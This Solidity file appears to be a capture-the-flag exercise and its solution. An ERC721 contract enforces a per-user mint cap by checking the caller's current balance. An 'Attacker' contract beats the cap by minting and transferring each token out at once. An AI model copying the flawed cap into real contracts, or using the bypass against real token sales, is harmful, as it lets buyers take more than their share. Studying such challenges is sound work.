// SPDX-License-Identifier: MIT

pragma solidity ^0.8.26;

import "@openzeppelin/contracts@v4.9.6/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts@v4.9.6/token/ERC721/IERC721Receiver.sol";


contract Overmint2 is ERC721 {
    using Address for address;
    uint256 public totalSupply;

    constructor() ERC721("Overmint2", "AT") {}

    function mint() external {
        require(balanceOf(msg.sender) <= 3, "max 3 NFTs");
        totalSupply++;
        _mint(msg.sender, totalSupply);
    }

    function success() external view returns (bool) {
        return balanceOf(msg.sender) == 5;
    }
}

contract Attacker {
    Overmint2 public overmint2;
    address public owner;

    constructor(address _overmint2) {
        overmint2 = Overmint2(_overmint2);
        owner = msg.sender;
    }

    function attack() external {
        uint256 tokensMinted = 0;

        while (tokensMinted < 3) {
            overmint2.mint();
            tokensMinted++;
            overmint2.transferFrom(address(this), owner, tokensMinted);
        }

        tokensMinted = 0;
        while (tokensMinted < 2) {
            overmint2.mint();
            tokensMinted++;
            overmint2.transferFrom(address(this), owner, tokensMinted + 3);
        }

    }
}